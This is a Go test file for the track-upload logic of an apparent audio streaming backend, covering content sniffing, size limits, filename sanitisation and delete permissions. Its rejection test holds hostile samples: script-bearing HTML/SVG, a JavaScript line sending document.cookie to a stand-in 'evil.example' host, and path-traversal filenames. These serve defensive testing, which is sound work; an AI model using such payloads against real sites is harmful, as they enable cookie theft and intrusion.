package usecase

import (
	"bytes"
	"context"
	"errors"
	"io"
	"strings"
	"sync"
	"testing"

	"github.com/streampulse/backend/internal/domain/entity"
	"github.com/streampulse/backend/internal/domain/repository"
	domainstorage "github.com/streampulse/backend/internal/domain/storage"
)

// fakeStorage is an in-memory storage.Storage.
type fakeStorage struct {
	mu      sync.Mutex
	objects map[string][]byte

	failSave error
}

func newFakeStorage() *fakeStorage {
	return &fakeStorage{objects: map[string][]byte{}}
}

func (s *fakeStorage) Save(_ context.Context, key string, r io.Reader) (int64, error) {
	if s.failSave != nil {
		return 0, s.failSave
	}
	data, err := io.ReadAll(r)
	if err != nil {
		return 0, err
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	s.objects[key] = data
	return int64(len(data)), nil
}

func (s *fakeStorage) Open(_ context.Context, key string) (io.ReadSeekCloser, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	data, ok := s.objects[key]
	if !ok {
		return nil, domainstorage.ErrNotFound
	}
	return nopSeekCloser{bytes.NewReader(data)}, nil
}

func (s *fakeStorage) Delete(_ context.Context, key string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if _, ok := s.objects[key]; !ok {
		return domainstorage.ErrNotFound
	}
	delete(s.objects, key)
	return nil
}

func (s *fakeStorage) Exists(_ context.Context, key string) (bool, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	_, ok := s.objects[key]
	return ok, nil
}

func (s *fakeStorage) count() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return len(s.objects)
}

type nopSeekCloser struct{ *bytes.Reader }

func (nopSeekCloser) Close() error { return nil }

var _ domainstorage.Storage = (*fakeStorage)(nil)

// fakeTrackRepo is an in-memory repository.TrackRepository.
type fakeTrackRepo struct {
	mu      sync.Mutex
	byID    map[string]*entity.AudioTrack
	counter int

	failCreate error
}

func newFakeTrackRepo() *fakeTrackRepo {
	return &fakeTrackRepo{byID: map[string]*entity.AudioTrack{}}
}

func (r *fakeTrackRepo) Create(_ context.Context, t *entity.AudioTrack) error {
	if r.failCreate != nil {
		return r.failCreate
	}
	r.mu.Lock()
	defer r.mu.Unlock()
	r.counter++
	if t.ID == "" {
		t.ID = "track-" + string(rune('a'-1+r.counter))
	}
	clone := *t
	r.byID[t.ID] = &clone
	return nil
}

func (r *fakeTrackRepo) FindByID(_ context.Context, id string) (*entity.AudioTrack, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if t, ok := r.byID[id]; ok {
		clone := *t
		return &clone, nil
	}
	return nil, repository.ErrNotFound
}

func (r *fakeTrackRepo) List(_ context.Context, limit, offset int) ([]entity.AudioTrack, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	out := make([]entity.AudioTrack, 0, len(r.byID))
	for _, t := range r.byID {
		out = append(out, *t)
	}
	if offset >= len(out) {
		return []entity.AudioTrack{}, nil
	}
	end := min(offset+limit, len(out))
	return out[offset:end], nil
}

func (r *fakeTrackRepo) ListByUploader(_ context.Context, uploaderID string) ([]entity.AudioTrack, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	out := make([]entity.AudioTrack, 0)
	for _, t := range r.byID {
		if t.UploaderID == uploaderID {
			out = append(out, *t)
		}
	}
	return out, nil
}

func (r *fakeTrackRepo) Delete(_ context.Context, id string) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	if _, ok := r.byID[id]; !ok {
		return repository.ErrNotFound
	}
	delete(r.byID, id)
	return nil
}

var _ repository.TrackRepository = (*fakeTrackRepo)(nil)

func newTrackUC(t *testing.T) (*TrackUseCase, *fakeTrackRepo, *fakeStorage) {
	t.Helper()
	repo := newFakeTrackRepo()
	store := newFakeStorage()
	return NewTrackUseCase(repo, store), repo, store
}

// mp3WithID3 is a payload http.DetectContentType recognises as audio/mpeg.
func mp3WithID3(padTo int) io.Reader {
	head := append([]byte("ID3\x03\x00\x00\x00"), bytes.Repeat([]byte{0x00}, 20)...)
	if padTo > len(head) {
		head = append(head, bytes.Repeat([]byte{0x11}, padTo-len(head))...)
	}
	return bytes.NewReader(head)
}

func validUpload(body io.Reader) UploadInput {
	return UploadInput{
		UploaderID:  "user-1",
		Title:       "Nocturne",
		Artist:      "KaysZ",
		Filename:    "nocturne.mp3",
		ContentType: "audio/mpeg",
		Body:        body,
	}
}

func TestTrackUseCase_Upload(t *testing.T) {
	uc, repo, store := newTrackUC(t)

	track, err := uc.Upload(context.Background(), validUpload(mp3WithID3(2048)))
	if err != nil {
		t.Fatalf("Upload() error = %v", err)
	}

	if track.Title != "Nocturne" || track.Artist != "KaysZ" {
		t.Errorf("metadata = %+v, unexpected", track)
	}
	if track.SizeBytes != 2048 {
		t.Errorf("SizeBytes = %d, want 2048", track.SizeBytes)
	}
	if !strings.HasSuffix(track.StorageKey, ".mp3") {
		t.Errorf("StorageKey = %q, want a .mp3 suffix", track.StorageKey)
	}
	if strings.Contains(track.StorageKey, "nocturne") {
		t.Errorf("StorageKey = %q — it must not be derived from the client filename", track.StorageKey)
	}
	if store.count() != 1 {
		t.Errorf("stored %d objects, want 1", store.count())
	}
	if _, err := repo.FindByID(context.Background(), track.ID); err != nil {
		t.Errorf("track not persisted: %v", err)
	}
}

func TestTrackUseCase_UploadRejectsActiveContentDisguisedAsAudio(t *testing.T) {
	// The security test of this use case: an attacker declares audio/mpeg
	// and names the file .mp3, but the bytes are HTML. If we trusted the
	// declared type, that file could later be served back and executed.
	payloads := map[string]string{
		"html":       "<!DOCTYPE html><html><body><script>alert(1)</script></body></html>",
		"plain html": "<html><head><title>x</title></head><body>hi</body></html>",
		"pdf":        "%PDF-1.4\n%\xe2\xe3\xcf\xd3\n1 0 obj",

		// The four below all sniff as text/plain, and every one of them got
		// through the first version of this check (see the review on PR #23).
		// They are the regression guard for the blanket text/ rule.
		"svg with xml prolog": `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`,
		"bare svg, no prolog": `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`,
		"raw javascript":      `(function(){fetch('https://evil.example/'+document.cookie)})();`,
		"xml without prolog":  `<root><child>payload</child></root>`,
	}

	for name, payload := range payloads {
		t.Run(name, func(t *testing.T) {
			uc, _, store := newTrackUC(t)
			in := validUpload(strings.NewReader(payload))

			_, err := uc.Upload(context.Background(), in)

			if !errors.Is(err, ErrUnsupportedMedia) {
				t.Errorf("Upload() error = %v, want ErrUnsupportedMedia", err)
			}
			if store.count() != 0 {
				t.Error("a rejected upload still wrote an object to storage")
			}
		})
	}
}

func TestTrackUseCase_UploadAcceptsAudioTheSnifferCannotIdentify(t *testing.T) {
	// Go's sniffer only knows a handful of containers: a raw MP3 with no ID3
	// tag, an AAC or a FLAC all come back as application/octet-stream.
	// Whitelisting on the sniff would reject them — hence rejecting active
	// content instead. This test pins that decision.
	uc, _, store := newTrackUC(t)
	// A realistic frame pattern: real MP3 frames carry bytes below 0x20 in
	// their side-info, which is what makes them sniff as octet-stream. The
	// first version of this test used only bytes >= 0x20, so its payload
	// actually sniffed as text/plain — it was passing for the wrong reason.
	rawMP3 := bytes.Repeat([]byte{0xFF, 0xFB, 0x90, 0x00, 0x0A, 0x11}, 128)

	track, err := uc.Upload(context.Background(), validUpload(bytes.NewReader(rawMP3)))
	if err != nil {
		t.Fatalf("Upload() of a raw MP3 error = %v, want it accepted", err)
	}
	if store.count() != 1 || track.SizeBytes != int64(len(rawMP3)) {
		t.Errorf("stored %d objects, size %d — want 1 object of %d bytes", store.count(), track.SizeBytes, len(rawMP3))
	}
}

func TestTrackUseCase_UploadRejectsUndeclaredOrUnknownTypes(t *testing.T) {
	for _, ct := range []string{"", "application/octet-stream", "video/mp4", "text/plain", "image/png"} {
		t.Run(ct, func(t *testing.T) {
			uc, _, store := newTrackUC(t)
			in := validUpload(mp3WithID3(1024))
			in.ContentType = ct

			if _, err := uc.Upload(context.Background(), in); !errors.Is(err, ErrUnsupportedMedia) {
				t.Errorf("Upload() error = %v, want ErrUnsupportedMedia", err)
			}
			if store.count() != 0 {
				t.Error("a rejected upload still wrote an object")
			}
		})
	}
}

func TestTrackUseCase_UploadAcceptsEveryDeclaredAudioType(t *testing.T) {
	for ct, ext := range acceptedAudioTypes {
		t.Run(ct, func(t *testing.T) {
			uc, _, _ := newTrackUC(t)
			in := validUpload(mp3WithID3(1024))
			in.ContentType = ct

			track, err := uc.Upload(context.Background(), in)
			if err != nil {
				t.Fatalf("Upload() error = %v", err)
			}
			if !strings.HasSuffix(track.StorageKey, ext) {
				t.Errorf("StorageKey = %q, want extension %q", track.StorageKey, ext)
			}
		})
	}
}

func TestTrackUseCase_UploadNormalisesContentTypeParameters(t *testing.T) {
	// Browsers send things like "audio/mpeg; charset=UTF-8".
	uc, _, _ := newTrackUC(t)
	in := validUpload(mp3WithID3(1024))
	in.ContentType = "Audio/MPEG; charset=UTF-8"

	track, err := uc.Upload(context.Background(), in)
	if err != nil {
		t.Fatalf("Upload() error = %v", err)
	}
	if track.ContentType != "audio/mpeg" {
		t.Errorf("ContentType = %q, want audio/mpeg", track.ContentType)
	}
}

func TestTrackUseCase_UploadRejectsAnEmptyFile(t *testing.T) {
	uc, _, store := newTrackUC(t)

	if _, err := uc.Upload(context.Background(), validUpload(strings.NewReader(""))); !errors.Is(err, ErrEmptyFile) {
		t.Errorf("Upload() error = %v, want ErrEmptyFile", err)
	}
	if store.count() != 0 {
		t.Error("an empty upload still wrote an object")
	}
}

func TestTrackUseCase_UploadEnforcesTheSizeLimit(t *testing.T) {
	// The limit is enforced by counting streamed bytes, not by reading a
	// declared Content-Length — a header is a claim, not a fact.
	uc, repo, store := newTrackUC(t)
	oversized := io.MultiReader(mp3WithID3(sniffLen), bytes.NewReader(bytes.Repeat([]byte{0x11}, MaxUploadBytes)))

	_, err := uc.Upload(context.Background(), validUpload(oversized))

	if !errors.Is(err, ErrFileTooLarge) {
		t.Fatalf("Upload() error = %v, want ErrFileTooLarge", err)
	}
	if store.count() != 0 {
		t.Error("the oversized object was left behind in storage")
	}
	tracks, _ := repo.List(context.Background(), 10, 0)
	if len(tracks) != 0 {
		t.Error("an oversized upload still created a row")
	}
}

func TestTrackUseCase_UploadAcceptsExactlyTheLimit(t *testing.T) {
	uc, _, _ := newTrackUC(t)
	head := make([]byte, sniffLen)
	copy(head, "ID3\x03\x00\x00\x00")
	body := io.MultiReader(
		bytes.NewReader(head),
		bytes.NewReader(bytes.Repeat([]byte{0x11}, MaxUploadBytes-sniffLen)),
	)

	track, err := uc.Upload(context.Background(), validUpload(body))
	if err != nil {
		t.Fatalf("Upload() at exactly the limit error = %v, want nil", err)
	}
	if track.SizeBytes != MaxUploadBytes {
		t.Errorf("SizeBytes = %d, want %d", track.SizeBytes, MaxUploadBytes)
	}
}

func TestTrackUseCase_UploadValidatesMetadata(t *testing.T) {
	cases := map[string]func(*UploadInput){
		"empty title":     func(in *UploadInput) { in.Title = "   " },
		"over-long title": func(in *UploadInput) { in.Title = strings.Repeat("a", maxTrackTitleLen+1) },
		"long artist":     func(in *UploadInput) { in.Artist = strings.Repeat("a", maxTrackArtistLen+1) },
	}

	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			uc, _, store := newTrackUC(t)
			in := validUpload(mp3WithID3(1024))
			mutate(&in)

			if _, err := uc.Upload(context.Background(), in); !errors.Is(err, ErrInvalidTrack) {
				t.Errorf("Upload() error = %v, want ErrInvalidTrack", err)
			}
			if store.count() != 0 {
				t.Error("metadata was rejected but an object was still written")
			}
		})
	}
}

func TestTrackUseCase_UploadSanitisesTheClientFilename(t *testing.T) {
	// The filename never touches the filesystem (the key is a UUID), but it
	// does reach a Content-Disposition header — so quotes, control bytes and
	// path segments have to go.
	cases := map[string]string{
		"../../etc/passwd":    "passwd",
		`..\..\windows\a.mp3`: "a.mp3",
		"nor\"mal.mp3":        "normal.mp3",
		"with\nnewline.mp3":   "withnewline.mp3",
		"plain.mp3":           "plain.mp3",
		"..":                  "",
	}

	for input, want := range cases {
		t.Run(input, func(t *testing.T) {
			uc, _, _ := newTrackUC(t)
			in := validUpload(mp3WithID3(1024))
			in.Filename = input

			track, err := uc.Upload(context.Background(), in)
			if err != nil {
				t.Fatalf("Upload() error = %v", err)
			}
			if track.Filename != want {
				t.Errorf("Filename = %q, want %q", track.Filename, want)
			}
		})
	}
}

func TestTrackUseCase_UploadCleansUpWhenTheRowCannotBeWritten(t *testing.T) {
	// An object with no row is unreachable garbage that nothing will ever
	// delete — so the object goes if the row fails.
	uc, repo, store := newTrackUC(t)
	repo.failCreate = errors.New("db down")

	if _, err := uc.Upload(context.Background(), validUpload(mp3WithID3(1024))); err == nil {
		t.Fatal("Upload() error = nil, want the persistence failure surfaced")
	}
	if store.count() != 0 {
		t.Error("the orphaned object was not cleaned up")
	}
}

func TestTrackUseCase_UploadSurfacesStorageFailures(t *testing.T) {
	uc, repo, _ := newTrackUC(t)
	uc.storage.(*fakeStorage).failSave = errors.New("disk full")

	if _, err := uc.Upload(context.Background(), validUpload(mp3WithID3(1024))); err == nil {
		t.Fatal("Upload() error = nil, want the storage failure surfaced")
	}
	tracks, _ := repo.List(context.Background(), 10, 0)
	if len(tracks) != 0 {
		t.Error("a failed store still created a row")
	}
}

func TestTrackUseCase_Open(t *testing.T) {
	uc, _, _ := newTrackUC(t)
	track, err := uc.Upload(context.Background(), validUpload(mp3WithID3(1024)))
	if err != nil {
		t.Fatalf("Upload() error = %v", err)
	}

	got, body, err := uc.Open(context.Background(), track.ID)
	if err != nil {
		t.Fatalf("Open() error = %v", err)
	}
	defer func() { _ = body.Close() }()

	if got.ID != track.ID {
		t.Errorf("Open() returned track %q, want %q", got.ID, track.ID)
	}
	data, err := io.ReadAll(body)
	if err != nil {
		t.Fatalf("ReadAll() error = %v", err)
	}
	if len(data) != 1024 {
		t.Errorf("read %d bytes, want 1024", len(data))
	}
}

func TestTrackUseCase_OpenUnknownTrack(t *testing.T) {
	uc, _, _ := newTrackUC(t)

	if _, _, err := uc.Open(context.Background(), "ghost"); !errors.Is(err, repository.ErrNotFound) {
		t.Errorf("Open() error = %v, want ErrNotFound", err)
	}
}

func TestTrackUseCase_OpenRowWithoutObject(t *testing.T) {
	// Metadata says the track exists but the bytes are gone: a 404 is the
	// honest answer, not a 500.
	uc, _, store := newTrackUC(t)
	track, err := uc.Upload(context.Background(), validUpload(mp3WithID3(1024)))
	if err != nil {
		t.Fatalf("Upload() error = %v", err)
	}
	if err := store.Delete(context.Background(), track.StorageKey); err != nil {
		t.Fatalf("Delete() error = %v", err)
	}

	if _, _, err := uc.Open(context.Background(), track.ID); !errors.Is(err, repository.ErrNotFound) {
		t.Errorf("Open() error = %v, want ErrNotFound", err)
	}
}

func TestTrackUseCase_Delete(t *testing.T) {
	uc, repo, store := newTrackUC(t)
	track, err := uc.Upload(context.Background(), validUpload(mp3WithID3(1024)))
	if err != nil {
		t.Fatalf("Upload() error = %v", err)
	}

	t.Run("a stranger cannot delete", func(t *testing.T) {
		if err := uc.Delete(context.Background(), track.ID, "attacker", string(entity.RoleUser)); !errors.Is(err, ErrStreamForbidden) {
			t.Errorf("Delete() error = %v, want ErrStreamForbidden", err)
		}
		if store.count() != 1 {
			t.Error("a rejected delete still removed the object")
		}
	})

	t.Run("the uploader can", func(t *testing.T) {
		if err := uc.Delete(context.Background(), track.ID, "user-1", string(entity.RoleUser)); err != nil {
			t.Fatalf("Delete() error = %v", err)
		}
		if store.count() != 0 {
			t.Error("the stored object outlived the track")
		}
		if _, err := repo.FindByID(context.Background(), track.ID); !errors.Is(err, repository.ErrNotFound) {
			t.Errorf("row still present after Delete: %v", err)
		}
	})
}

func TestTrackUseCase_DeleteByAdmin(t *testing.T) {
	uc, _, store := newTrackUC(t)
	track, err := uc.Upload(context.Background(), validUpload(mp3WithID3(1024)))
	if err != nil {
		t.Fatalf("Upload() error = %v", err)
	}

	if err := uc.Delete(context.Background(), track.ID, "moderator", string(entity.RoleAdmin)); err != nil {
		t.Fatalf("admin Delete() error = %v", err)
	}
	if store.count() != 0 {
		t.Error("admin delete left the object behind")
	}
}

func TestTrackUseCase_DeleteToleratesAMissingObject(t *testing.T) {
	// Object already gone (manual cleanup, failed earlier delete): removing
	// the row must still succeed rather than wedging the track forever.
	uc, repo, store := newTrackUC(t)
	track, err := uc.Upload(context.Background(), validUpload(mp3WithID3(1024)))
	if err != nil {
		t.Fatalf("Upload() error = %v", err)
	}
	if err := store.Delete(context.Background(), track.StorageKey); err != nil {
		t.Fatalf("Delete() error = %v", err)
	}

	if err := uc.Delete(context.Background(), track.ID, "user-1", string(entity.RoleUser)); err != nil {
		t.Fatalf("Delete() error = %v, want nil", err)
	}
	if _, err := repo.FindByID(context.Background(), track.ID); !errors.Is(err, repository.ErrNotFound) {
		t.Error("row survived a delete whose object was already missing")
	}
}

func TestTrackUseCase_DeleteUnknownTrack(t *testing.T) {
	uc, _, _ := newTrackUC(t)

	if err := uc.Delete(context.Background(), "ghost", "user-1", string(entity.RoleUser)); !errors.Is(err, repository.ErrNotFound) {
		t.Errorf("Delete() error = %v, want ErrNotFound", err)
	}
}

func TestTrackUseCase_ListClampsPagination(t *testing.T) {
	uc, _, _ := newTrackUC(t)
	for range 3 {
		if _, err := uc.Upload(context.Background(), validUpload(mp3WithID3(512))); err != nil {
			t.Fatalf("Upload() error = %v", err)
		}
	}

	for _, tc := range []struct{ limit, offset int }{{0, 0}, {-5, -5}, {1000, 0}} {
		got, err := uc.List(context.Background(), tc.limit, tc.offset)
		if err != nil {
			t.Fatalf("List(%d, %d) error = %v", tc.limit, tc.offset, err)
		}
		if len(got) != 3 {
			t.Errorf("List(%d, %d) returned %d tracks, want 3", tc.limit, tc.offset, len(got))
		}
	}
}

func TestTrackUseCase_ListMine(t *testing.T) {
	uc, _, _ := newTrackUC(t)
	mine := validUpload(mp3WithID3(512))
	if _, err := uc.Upload(context.Background(), mine); err != nil {
		t.Fatalf("Upload() error = %v", err)
	}
	theirs := validUpload(mp3WithID3(512))
	theirs.UploaderID = "user-2"
	if _, err := uc.Upload(context.Background(), theirs); err != nil {
		t.Fatalf("Upload() error = %v", err)
	}

	got, err := uc.ListMine(context.Background(), "user-1")
	if err != nil {
		t.Fatalf("ListMine() error = %v", err)
	}
	if len(got) != 1 || got[0].UploaderID != "user-1" {
		t.Errorf("ListMine() = %+v, want only user-1's track", got)
	}
}
